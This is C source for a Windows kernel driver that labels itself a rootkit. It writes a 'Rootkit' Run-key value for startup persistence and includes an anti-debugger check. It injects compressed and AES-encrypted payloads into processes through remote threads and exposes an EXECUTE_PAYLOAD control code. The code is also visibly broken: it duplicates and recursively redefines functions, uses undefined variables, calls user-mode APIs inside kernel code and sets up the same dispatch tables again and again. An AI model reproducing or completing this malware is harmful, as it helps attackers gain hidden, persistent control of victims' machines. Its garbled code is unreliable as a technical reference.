#include <ntifs.h>
#include <ntddk.h>
#include <wdm.h>
#define IOCTL_EXECUTE_PAYLOAD CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define RUN_KEY L"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define VALUE_NAME L"Rootkit"
NTSTATUS ExecuteAtStartup(PUNICODE_STRING FilePath)
{
    HANDLE hKey;
    UNICODE_STRING uRunKey, uValue;
    NTSTATUS status;
    RtlInitUnicodeString(&uRunKey, RUN_KEY);
    RtlInitUnicodeString(&uValue, VALUE_NAME);
    status = RtlCreateRegistryKey(RTL_REGISTRY_ABSOLUTE, &uRunKey, KEY_ALL_ACCESS, NULL, REG_OPTION_NON_VOLATILE, NULL, &hKey, NULL);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("RtlCreateRegistryKey failed with status 0x%x\n", status);
        return status;
    }
    status = RtlSetRegistryValue(RTL_REGISTRY_ABSOLUTE, hKey, &uValue, REG_SZ, FilePath->Buffer, FilePath->Length + sizeof(WCHAR));
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("RtlSetRegistryValue failed with status 0x%x\n", status);
        ZwClose(hKey);
        return status;
    }
    ZwClose(hKey);
    return STATUS_SUCCESS;
}
#ifdef _WIN64
#define IsDebuggerPresent() (__readgsqword(0x30) & 0x000000000000001F)
#else
#define IsDebuggerPresent() (__readfsdword(0x30) & 0x0000000F)
#endif
NTSTATUS ExecuteInProcess(HANDLE hProcess, PVOID Payload, SIZE_T PayloadSize)
{
    HANDLE hThread;
    NTSTATUS status;
    if (IsDebuggerPresent())
    {
        return STATUS_DEBUGGER_INACTIVE;
    }
    PVOID pRemoteBuffer = NULL;
    status = ZwAllocateVirtualMemory(hProcess, &pRemoteBuffer, 0, &PayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("ZwAllocateVirtualMemory failed with status 0x%x\n", status);
        return status;
    }
    SIZE_T bytesWritten;
    status = ZwWriteVirtualMemory(hProcess, pRemoteBuffer, Payload, PayloadSize, &bytesWritten);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("ZwWriteVirtualMemory failed with status 0x%x\n", status);
        return status;
    }
    OBJECT_ATTRIBUTES objAttrs;
    InitializeObjectAttributes(&objAttrs, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
    CLIENT_ID cid;
    cid.UniqueProcess = hProcess;
    cid.UniqueThread = NULL;
    status = ZwCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &objAttrs, hProcess, pRemoteBuffer, NULL, FALSE, 0, 0, 0, &cid);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("ZwCreateThreadEx failed with status 0x%x\n", status);
        ZwFreeVirtualMemory(hProcess, &pRemoteBuffer, &PayloadSize, MEM_RELEASE);
        return status;
    }
    ZwClose(hThread);
    return STATUS_SUCCESS;
}
NTSTATUS ExecuteOutOfProcess(PUNICODE_STRING FilePath, PVOID Payload, SIZE_T PayloadSize)
{
    NTSTATUS status;
    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttrs;
    InitializeObjectAttributes(&objAttrs, FilePath, OBJ_KERNEL_HANDLE, NULL, NULL);
    IO_STATUS_BLOCK ioStatus;
    status = ZwCreateFile(&hFile, GENERIC_WRITE, &objAttrs, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_NON_DIRECTORY_FILE, NULL, 0);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("ZwCreateFile failed with status 0x%x\n", status);
        return status;
    }
    ULONG compressBufSize = compressBound(PayloadSize);
    PVOID compressBuf = ExAllocatePoolWithTag(PagedPool, compressBufSize, 'Zlib');
    if (compressBuf == NULL)
    {
        DbgPrint("ExAllocatePoolWithTag failed\n");
        ZwClose(hFile);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    int compressStatus = compress((Bytef*)compressBuf, (uLongf*)&compressBufSize, (const Bytef*)Payload, PayloadSize);
    if (compressStatus != Z_OK)
    {
        DbgPrint("compress failed with status %d\n", compressStatus);
        ExFreePoolWithTag(compressBuf, 'Zlib');
        ZwClose(hFile);
        return STATUS_UNSUCCESSFUL;
    }
    status = ZwWriteFile(hFile, NULL, NULL, NULL, &ioStatus, compressBuf, compressBufSize, NULL, NULL);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("ZwWriteFile failed with status 0x%x\n", status);
        ExFreePoolWithTag(compressBuf, 'Zlib');
        ZwClose(hFile);
        return status;
    }
    ExFreePoolWithTag(compressBuf, 'Zlib');
    ZwClose(hFile);
    UNICODE_STRING uDosFileName;
    RtlInitUnicodeString(&uDosFileName, L"\\DosDevices\\C:\\Temp\\payload.exe");
    OBJECT_ATTRIBUTES objAttrs;
    InitializeObjectAttributes(&objAttrs, &uDosFileName, OBJ_KERNEL_HANDLE, NULL, NULL);
    HANDLE hPayload;
    status = ZwCreateFile(&hPayload, GENERIC_READ | SYNCHRONIZE, &objAttrs, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("ZwCreateFile failed with status 0x%x\n", status);
        return status;
    }
    PVOID pMappedPayload = NULL;
    status = ZwMapViewOfSection(hPayload, NtCurrentProcess(), &pMappedPayload, 0, 0, NULL, &PayloadSize, ViewShare, 0, PAGE_EXECUTE_READ);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("ZwMapViewOfSection failed with status 0x%x\n", status);
        ZwClose(hPayload);
        return status;
    }
    ZwClose(hPayload);
    hThread = CreateRemoteThread(hProcess, NULL, 0, pMappedPayload, NULL, 0, NULL);
    if (hThread == NULL)
    {
        DbgPrint("CreateRemoteThread failed with status 0x%x\n", GetLastError());
        ZwUnmapViewOfSection(hProcess, pMappedPayload);
        return STATUS_UNSUCCESSFUL;
    }
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    ZwUnmapViewOfSection(hProcess, pMappedPayload);
    return STATUS_SUCCESS;
}

NTSTATUS ExecuteOutOfProcess(PUNICODE_STRING FilePath, PVOID Payload, SIZE_T PayloadSize)
{
    HANDLE hFile;
    IO_STATUS_BLOCK ioStatus;
    UNICODE_STRING uNtFileName;
    OBJECT_ATTRIBUTES objAttrs;
    NTSTATUS status;

    RtlInitUnicodeString(&uNtFileName, FilePath->Buffer);
    InitializeObjectAttributes(&objAttrs, &uNtFileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    status = ZwCreateFile(&hFile, FILE_WRITE_DATA, &objAttrs, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("ZwCreateFile failed with status 0x%x\n", status);
        return status;
    }
    ULONG cbCompressedPayload = compressBound(PayloadSize);
    PVOID pCompressedPayload = ExAllocatePoolWithTag(NonPagedPool, cbCompressedPayload, 'CPay');
    if (pCompressedPayload == NULL)
    {
        DbgPrint("ExAllocatePoolWithTag failed\n");
        ZwClose(hFile);
        return STATUS_NO_MEMORY;
    }
    if (compress(pCompressedPayload, &cbCompressedPayload, Payload, PayloadSize) != Z_OK)
    {
        DbgPrint("compress failed\n");
        ExFreePoolWithTag(pCompressedPayload, 'CPay');
        ZwClose(hFile);
        return STATUS_UNSUCCESSFUL;
    }
    if (ZwWriteFile(hFile, NULL, NULL, NULL, &ioStatus, pCompressedPayload, cbCompressedPayload, NULL, NULL) != STATUS_SUCCESS)
    {
        DbgPrint("ZwWriteFile failed with status 0x%x\n", GetLastError());
        ExFreePoolWithTag(pCompressedPayload, 'CPay');
        ZwClose(hFile);
        return STATUS_UNSUCCESSFUL;
    }
    ExFreePoolWithTag(pCompressedPayload, 'CPay');
    ZwClose(hFile);
    return STATUS_SUCCESS;
}

NTSTATUS ObRegisterCallbacks(PDRIVER_OBJECT pDriverObject, POB_CALLBACK_REGISTRATION CallbackRegistration)
{
    NTSTATUS status;
    OB_OPERATION_REGISTRATION OperationRegistration = { 0 };
    OperationRegistration.ObjectType = CallbackRegistration->ObjectType;
    OperationRegistration.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
    OperationRegistration.PreOperation = PreObjectOperation;
    OperationRegistration.PostOperation = PostObjectOperation;
    status = ObRegisterCallbacks(&OperationRegistration, &g_pPreOperation);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("ObRegisterCallbacks failed with status 0x%x\n", status);
        return status;
    }
    OperationRegistration.Operations = OB_OPERATION_HANDLE_CLOSE;
    OperationRegistration.PreOperation = NULL;
    OperationRegistration.PostOperation = PostCloseObjectOperation;
    status = ObRegisterCallbacks(&OperationRegistration, &g_pPostCloseOperation);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("ObRegisterCallbacks failed with status 0x%x\n", status);
        ObUnregisterCallbacks(g_pPreOperation);
        return status;
    }
    return STATUS_SUCCESS;
}

NTSTATUS ObUnregisterCallbacks(PVOID pRegistrationHandle)
{
    ObUnregisterCallbacks(g_pPostCloseOperation);
    ObUnregisterCallbacks(g_pPreOperation);
    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
    NTSTATUS status;
    PDEVICE_OBJECT pDeviceObject;
    UNICODE_STRING uDeviceName, uDosDeviceName;
    OBJECT_ATTRIBUTES objAttrs;
    IO_STATUS_BLOCK ioStatus;
    ULONG cbCompressedPayload = 0;
    PVOID pCompressedPayload = NULL;
    PVOID pPayload = NULL;
    ULONG PayloadSize = 0;
    UNICODE_STRING uExecutablePath;
    POB_CALLBACK_REGISTRATION pCallbackRegistration;
    OB_CALLBACK_REGISTRATION CallbackRegistration;

    RtlInitUnicodeString(&uDeviceName, DEVICE_NAME);
    RtlInitUnicodeString(&uDosDeviceName, DOS_DEVICE_NAME);
    pDriverObject->DriverUnload = Unload;

    // Set up the fast IO dispatch table
    for (UINT i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
    {
        pDriverObject->FastIoDispatch[i] = FastIoDispatch;
    }
    pDriverObject->FastIoDispatch->SizeOfFastIoDispatch = sizeof(FAST_IO_DISPATCH);
    // Set up the file system filter dispatch table
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;

    // Create a device object
    status = IoCreateDevice(pDriverObject, 0, &uDeviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("IoCreateDevice failed with status 0x%x\n", status);
        return status;
    }
    pDeviceObject->Flags |= DO_DIRECT_IO;

    // Create a symbolic link for the device object
    status = IoCreateSymbolicLink(&uDosDeviceName, &uDeviceName);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("IoCreateSymbolicLink failed with status 0x%x\n", status);
        IoDeleteDevice(pDeviceObject);
        return status;
    }
    // Set up the device dispatch table
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;

    // Read the payload from the resource section
    status = ReadPayload(&pPayload, &PayloadSize);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("ReadPayload failed with status 0x%x\n", status);
        IoDeleteSymbolicLink(&uDosDeviceName);
        IoDeleteDevice(pDeviceObject);
        return status;
    }
    // Compress the payload using zlib
    status = CompressPayload(pPayload, PayloadSize, &pCompressedPayload, &cbCompressedPayload);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("CompressPayload failed with status 0x%x\n", status);
        ExFreePool(pPayload);
        IoDeleteSymbolicLink(&uDosDeviceName);
        IoDeleteDevice(pDeviceObject);
        return status;
    }
    ExFreePool(pPayload);

    // Obtain the executable path
    status = ObtainExecutablePath(&uExecutablePath);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("ObtainExecutablePath failed with status 0x%x\n", status);
        ExFreePool(pCompressedPayload);
        IoDeleteSymbolicLink(&uDosDeviceName);
        IoDeleteDevice(pDeviceObject);
        return status;
    }
    // Set the payload as an environment variable
    status = SetEnvironmentVariableW(L"Payload", (LPCWSTR)pCompressedPayload);
    if (status == FALSE)
    {
        DbgPrint("SetEnvironmentVariableW failed with error 0x%x\n", GetLastError());
        ExFreePool(pCompressedPayload);
        ExFreePool(uExecutablePath.Buffer);
        IoDeleteSymbolicLink(&uDosDeviceName);
        IoDeleteDevice(pDeviceObject);
        return STATUS_UNSUCCESSFUL;
    }
    ExFreePool(pCompressedPayload);

    // Execute the payload out-of-process
    status = ExecuteOutOfProcess(&uExecutablePath, Payload, PayloadSize);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("ExecuteOutOfProcess failed with status 0x%x\n", status);
        ExFreePool(uExecutablePath.Buffer);
        IoDeleteSymbolicLink(&uDosDeviceName);
        IoDeleteDevice(pDeviceObject);
        return status;
    }
    ExFreePool(uExecutablePath.Buffer);

    // Set up the fast IO dispatch table
    pDriverObject->FastIoDispatch = &FastIoDispatch;

    // Set up the file system filter dispatch table
    pDriverObject->FsFilterCallbacks.PreAcquireForSectionSynchronization = PreAcquireForSectionSynchronization;
    pDriverObject->FsFilterCallbacks.PostAcquireForSectionSynchronization = PostAcquireForSectionSynchronization;
    pDriverObject->FsFilterCallbacks.PreReleaseForSectionSynchronization = PreReleaseForSectionSynchronization;
    pDriverObject->FsFilterCallbacks.PostReleaseForSectionSynchronization = PostReleaseForSectionSynchronization;
    pDriverObject->FsFilterCallbacks.PreAcquireForCcFlush = PreAcquireForCcFlush;
    pDriverObject->FsFilterCallbacks.PostAcquireForCcFlush = PostAcquireForCcFlush;
    pDriverObject->FsFilterCallbacks.PreReleaseForCcFlush = PreReleaseForCcFlush;
    pDriverObject->FsFilterCallbacks.PostReleaseForCcFlush = PostReleaseForCcFlush;
    pDriverObject->FsFilterCallbacks.PreAcquireForModifiedPageWriter = PreAcquireForModifiedPageWriter;
    pDriverObject->FsFilterCallbacks.PostAcquireForModifiedPageWriter = PostAcquireForModifiedPageWriter;
    pDriverObject->FsFilterCallbacks.PreReleaseForModifiedPageWriter = PreReleaseForModifiedPageWriter;
    pDriverObject->FsFilterCallbacks.PostReleaseForModifiedPageWriter = PostReleaseForModifiedPageWriter;

    // Set up the device dispatch table
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = Create;
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = Close;
    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
    pDriverObject->MajorFunction[IRP_MJ_WRITE] = Write;
    pDriverObject->MajorFunction[IRP_MJ_READ] = Read;
    pDriverObject->MajorFunction[IRP_MJ_QUERY_INFORMATION] = QueryInformation;
    pDriverObject->MajorFunction[IRP_MJ_SET_INFORMATION] = SetInformation;
    pDriverObject->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] = DirectoryControl;
    pDriverObject->MajorFunction[IRP_MJ_FILE_SYSTEM_CONTROL] = FileSystemControl;
    pDriverObject->MajorFunction[IRP_MJ_CLEANUP] = Cleanup;
    pDriverObject->MajorFunction[IRP_MJ_SHUTDOWN] = Shutdown;
    pDriverObject->MajorFunction[IRP_MJ_PNP] = Pnp;
    pDriverObject->MajorFunction[IRP_MJ_FLUSH_BUFFERS] = FlushBuffers;
    pDriverObject->MajorFunction[IRP_MJ_QUERY_VOLUME_INFORMATION] = QueryVolumeInformation;
    pDriverObject->MajorFunction[IRP_MJ_SET_VOLUME_INFORMATION] = SetVolumeInformation;
    pDriverObject->MajorFunction[IRP_MJ_LOCK_CONTROL] = LockControl;
    pDriverObject->MajorFunction[IRP_MJ_QUERY_SECURITY] = QuerySecurity;
    pDriverObject->MajorFunction[IRP_MJ_SET_SECURITY] = SetSecurity;
    pDriverObject->MajorFunction[IRP_MJ_POWER] = Power;
    pDriverObject->MajorFunction[IRP_MJ_SYSTEM_CONTROL] = SystemControl;
    pDriverObject->MajorFunction[IRP_MJ_SHUTDOWN] = Shutdown;
    pDriverObject->MajorFunction[IRP_MJ_PNP] = Pnp;
    pDriverObject->DriverUnload = Unload;

    // Set up the fast IO dispatch table
    pDriverObject->FastIoDispatch = &FastIoDispatch;

    // Set up the file system filter dispatch table
    pDriverObject->FsFilterCallbacks.SizeOfFsFilterCallbacks = sizeof(FS_FILTER_CALLBACKS);
    pDriverObject->FsFilterCallbacks.PreAcquireForSectionSynchronization = PreAcquireForSectionSynchronization;
    pDriverObject->FsFilterCallbacks.PostAcquireForSectionSynchronization = PostAcquireForSectionSynchronization;
    pDriverObject->FsFilterCallbacks.PreReleaseForSectionSynchronization = PreReleaseForSectionSynchronization;
    pDriverObject->FsFilterCallbacks.PostReleaseForSectionSynchronization = PostReleaseForSectionSynchronization;
    pDriverObject->FsFilterCallbacks.PreAcquireForCcFlush = PreAcquireForCcFlush;
    pDriverObject->FsFilterCallbacks.PostAcquireForCcFlush = PostAcquireForCcFlush;
    pDriverObject->FsFilterCallbacks.PreReleaseForCcFlush = PreReleaseForCcFlush;
    pDriverObject->FsFilterCallbacks.PostReleaseForCcFlush = PostReleaseForCcFlush;
    pDriverObject->FsFilterCallbacks.PreReleaseForModifiedPageWriter = PreReleaseForModifiedPageWriter;
    pDriverObject->FsFilterCallbacks.PostReleaseForModifiedPageWriter = PostReleaseForModifiedPageWriter;

    // Set up the device dispatch table
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = Create;
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = Close;
    pDriverObject->MajorFunction[IRP_MJ_READ] = Read;
    pDriverObject->MajorFunction[IRP_MJ_WRITE] = Write;
    pDriverObject->MajorFunction[IRP_MJ_QUERY_INFORMATION] = QueryInformation;
    pDriverObject->MajorFunction[IRP_MJ_SET_INFORMATION] = SetInformation;
    pDriverObject->MajorFunction[IRP_MJ_QUERY_EA] = QueryEa;
    pDriverObject->MajorFunction[IRP_MJ_SET_EA] = SetEa;
    pDriverObject->MajorFunction[IRP_MJ_FLUSH_BUFFERS] = FlushBuffers;
    pDriverObject->MajorFunction[IRP_MJ_SET_VOLUME_INFORMATION] = SetVolumeInformation;
    pDriverObject->MajorFunction[IRP_MJ_LOCK_CONTROL] = LockControl;
    pDriverObject->MajorFunction[IRP_MJ_QUERY_SECURITY] = QuerySecurity;
    pDriverObject->MajorFunction[IRP_MJ_SET_SECURITY] = SetSecurity;
    pDriverObject->MajorFunction[IRP_MJ_POWER] = Power;
    pDriverObject->MajorFunction[IRP_MJ_SYSTEM_CONTROL] = SystemControl;
    pDriverObject->MajorFunction[IRP_MJ_SHUTDOWN] = Shutdown;
    pDriverObject->MajorFunction[IRP_MJ_PNP] = Pnp;
    pDriverObject->DriverUnload = Unload;

    // Create a symbolic link for the device
    UNICODE_STRING uLinkName;
    RtlInitUnicodeString(&uLinkName, LINK_NAME);
    status = IoCreateSymbolicLink(&uLinkName, &uDeviceName);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("IoCreateSymbolicLink failed with status 0x%x\n", status);
        IoDeleteDevice(pDeviceObject);
        return status;
    }

    // Create the device
    pDeviceObject->Flags |= DO_DIRECT_IO;
    pDeviceObject->AlignmentRequirement = FILE_WORD_ALIGNMENT;
    status = IoCreateDevice(pDriverObject, 0, &uDeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDeviceObject);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("IoCreateDevice failed with status 0x%x\n", status);
        IoDeleteSymbolicLink(&uLinkName);
        return status;
    }
    // Create the control device
    UNICODE_STRING uControlDeviceName;
    RtlInitUnicodeString(&uControlDeviceName, CONTROL_DEVICE_NAME);
    status = IoCreateDevice(pDriverObject, 0, &uControlDeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pControlDeviceObject);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("IoCreateDevice (control) failed with status 0x%x\n", status);
        IoDeleteDevice(pDeviceObject);
        IoDeleteSymbolicLink(&uLinkName);
        return status;
    }

    pControlDeviceObject->Flags |= DO_DIRECT_IO;
    pControlDeviceObject->AlignmentRequirement = FILE_WORD_ALIGNMENT;
    // Set up the fast IO dispatch table
    pDriverObject->FastIoDispatch = &FastIoDispatch;

    // Set up the file system filter dispatch table
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
    pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
    pDriverObject->MajorFunction[IRP_MJ_WRITE] = DispatchWrite;
    pDriverObject->MajorFunction[IRP_MJ_QUERY_INFORMATION] = DispatchQueryInformation;
    pDriverObject->MajorFunction[IRP_MJ_SET_INFORMATION] = DispatchSetInformation;
    pDriverObject->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] = DispatchDirectoryControl;
    pDriverObject->MajorFunction[IRP_MJ_FILE_SYSTEM_CONTROL] = DispatchFileSystemControl;
    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
    // Set up the device dispatch table
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
    pDriverObject->DriverUnload = Unload;

    // Compress the payload using zlib
    ULONG compressedPayloadSize = compressBound(PayloadSize);
    PUCHAR pCompressedPayload = ExAllocatePoolWithTag(NonPagedPool, compressedPayloadSize, POOL_TAG);
    if (pCompressedPayload == NULL)
    {
        DbgPrint("ExAllocatePoolWithTag failed\n");
        IoDeleteDevice(pDeviceObject);
        IoDeleteSymbolicLink(&uLinkName);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    int compressResult = compress(pCompressedPayload, &compressedPayloadSize, Payload, PayloadSize);
    if (compressResult != Z_OK)
    {
        DbgPrint("compress failed with error code %d\n", compressResult);
        ExFreePoolWithTag(pCompressedPayload, POOL_TAG);
        IoDeleteDevice(pDeviceObject);
        IoDeleteSymbolicLink(&uLinkName);
        return STATUS_UNSUCCESSFUL;
    }
    // Encrypt the compressed payload using AES
    PUCHAR pEncryptedPayload = NULL;
    ULONG encryptedPayloadSize = 0;
    status = EncryptAes(&pEncryptedPayload, &encryptedPayloadSize, pCompressedPayload, compressedPayloadSize);
    ExFreePoolWithTag(pCompressedPayload, POOL_TAG);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("EncryptAes failed with status 0x%x\n", status);
        IoDeleteDevice(pDeviceObject);
        IoDeleteSymbolicLink(&uLinkName);
        return status;
    }
    // Execute the encrypted payload in a new process
    UNICODE_STRING uCommandLine;
    RtlInitUnicodeString(&uCommandLine, L"");
    PROCESS_INFORMATION pi;
    status = CreateProcessA(NULL, "cmd.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("CreateProcessA failed with status 0x%x\n", status);
        ExFreePoolWithTag(pEncryptedPayload, POOL_TAG);
        IoDeleteDevice(pDeviceObject);
        IoDeleteSymbolicLink(&uLinkName);
        return status;
    }
    // Inject the encrypted payload into the new process
    status = ExecuteInProcess(pi.hProcess, pEncryptedPayload, encryptedPayloadSize);
    ExFreePoolWithTag(pEncryptedPayload, POOL_TAG);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("ExecuteInProcess failed with status 0x%x\n", status);
        NtTerminateProcess(pi.hProcess, status);
        NtClose(pi.hProcess);
        NtClose(pi.hThread);
        IoDeleteDevice(pDeviceObject);
        IoDeleteSymbolicLink(&uLinkName);
        return status;
    }
    // Resume the main thread of the new process
    status = NtResumeThread(pi.hThread, NULL);
    NtClose(pi.hThread);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("NtResumeThread failed with status 0x%x\n", status);
        NtTerminateProcess(pi.hProcess, status);
        NtClose(pi.hProcess);
        IoDeleteDevice(pDeviceObject);
        IoDeleteSymbolicLink(&uLinkName);
        return status;
    }
    // Wait for the new process to terminate
    status = NtWaitForSingleObject(pi.hProcess, TRUE, NULL);
    NtClose(pi.hProcess);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("NtWaitForSingleObject failed with status 0x%x\n", status);
        IoDeleteDevice(pDeviceObject);
        IoDeleteSymbolicLink(&uLinkName);
        return status;
    }

    return STATUS_SUCCESS;
}
// IOCTL handler for IOCTL_EXECUTE_PAYLOAD
NTSTATUS HandleIoctlExecutePayload(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
    PIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);
    PVOID pInputBuffer = pIrp->AssociatedIrp.SystemBuffer;
    ULONG inputBufferSize = pStackLocation->Parameters.DeviceIoControl.InputBufferLength;
    PVOID pOutputBuffer = pIrp->AssociatedIrp.SystemBuffer;
    ULONG outputBufferSize = pStackLocation->Parameters.DeviceIoControl.OutputBufferLength;

    // Validate the input buffer
    if (inputBufferSize < sizeof(EXECUTE_PAYLOAD_REQUEST))
    {
        DbgPrint("Invalid input buffer size\n");
        pIrp->IoStatus.Status = STATUS_INVALID_PARAMETER;
        pIrp->IoStatus.Information = 0;
        IoCompleteRequest(pIrp, IO_NO_INCREMENT);
        return STATUS_INVALID_PARAMETER;
    }
    // Validate the output buffer
    if (outputBufferSize < sizeof(EXECUTE_PAYLOAD_RESPONSE))
    {
        DbgPrint("Invalid output buffer size\n");
        pIrp->IoStatus.Status = STATUS_INVALID_PARAMETER;
        pIrp->IoStatus.Information = 0;
        IoCompleteRequest(pIrp, IO_NO_INCREMENT);
        return STATUS_INVALID_PARAMETER;
    }

    // Cast the input and output buffers to the correct types
    PEXECUTE_PAYLOAD_REQUEST pRequest = (PEXECUTE_PAYLOAD_REQUEST)pInputBuffer;
    PEXECUTE_PAYLOAD_RESPONSE pResponse = (PEXECUTE_PAYLOAD_RESPONSE)pOutputBuffer;
    // Decompress the payload using zlib
    SIZE_T payloadSize = 0;
    PVOID pPayload = DecompressPayload(pRequest->Payload, pRequest->PayloadSize, &payloadSize);
    if (pPayload == NULL)
    {
        DbgPrint("DecompressPayload failed\n");
        pIrp->IoStatus.Status = STATUS_UNSUCCESSFUL;
        pIrp->IoStatus.Information = 0;
        IoCompleteRequest(pIrp, IO_NO_INCREMENT);
        return STATUS_UNSUCCESSFUL;
    }
    // Execute the payload
    UNICODE_STRING filePath;
    RtlInitUnicodeString(&filePath, pRequest->FilePath);
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    switch (pRequest->ExecutionMethod)
    {
    case ExecutionMethodStartup:
        status = ExecuteAtStartup(&filePath);
        break;
    case ExecutionMethodProcess:
        status = ExecuteInProcess(NtCurrentProcess(), pPayload, payloadSize);
        break;
    case ExecutionMethodOutOfProcess:
        status = ExecuteOutOfProcess(&filePath, pPayload, payloadSize);
        break;
    }
    // Free the decompressed payload
    ExFreePool(pPayload);

    // Set the status code in the response
    pResponse->Status = status;

    // Set the size of the response
    pIrp->IoStatus.Information = sizeof(EXECUTE_PAYLOAD_RESPONSE);
    pIrp->IoStatus.Status = STATUS_SUCCESS;

    // Complete the IRP
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}
// Use obfuscated names for functions and variables
NTSTATUS FastIoRead(PFILE_OBJECT pFileObject, PLARGE_INTEGER pFileOffset, ULONG Length, BOOLEAN Wait, ULONG LockKey, PVOID Buffer, PIO_STATUS_BLOCK pIoStatusBlock)
{
    DbgPrint("FastIoRead called\n");
    return STATUS_SUCCESS;
}
